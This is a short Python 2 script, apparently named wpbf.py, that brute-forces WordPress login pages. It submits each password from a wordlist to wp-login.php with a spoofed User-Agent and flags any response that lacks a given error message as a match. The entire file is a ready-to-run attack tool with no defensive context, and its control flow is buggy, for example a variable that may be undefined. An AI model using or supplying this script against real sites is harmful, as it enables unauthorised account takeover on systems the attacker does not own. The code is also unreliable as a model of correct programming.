#!/usr/bin/env python
#Made by PasoendanBrigadeZ ( https://pasoendanbrigadez.ml )

import requests
import sys
import os
import subprocess
import platform

try:
	uerel = sys.argv[1]
	username = sys.argv[2]
	password = sys.argv[3]
	errormsg = sys.argv[4]
except:
	print "Use : python wpbf.py <url> <username> <password> <error message>"
	print "Example : python wpbf.py http://pasoendanbrigadez.ml/home/wp-login.php admin /root/wordlist/wordlist.txt incorrect"
	sys.exit(1)

wordlist = password
file = open(wordlist,'r')

if(platform.system() == "Linux"):
	subprocess.Popen("clear")
if(platform.system() == "Windows"):
	subprocess.Popen("cls")

for line in file.read().split("\n"):
	if line.strip():
		data = {'log':username,'pwd':line,'wp-submit':'Login'}
		r = requests.post(uerel, data, headers = {'User-Agent':'Internet Explorer/2.0'})
		x = r.text
		print "-"*70
		print r.url+"\nUsername : \33[33m"+username+"\33[0m|Password : \33[33m"+line+"\33[0m"
		def error():
			if x.find(errormsg) == -1:
				print "\33[31mDitemukan: \33[0m"
				print "Username : \33[31m"+username+"\33[0m|Password : \33[31m"+line+"\33[0m"
		if x.find(errormsg) == -1:
			print "\33[92mDitemukan\33[0m"
		else:
			found = 0
		print "-"*70
if(found == 0):
	print "\33[91mTidak dapat ditemukan\33[0m"
error()
file.close()
#print r.headers
#print r.text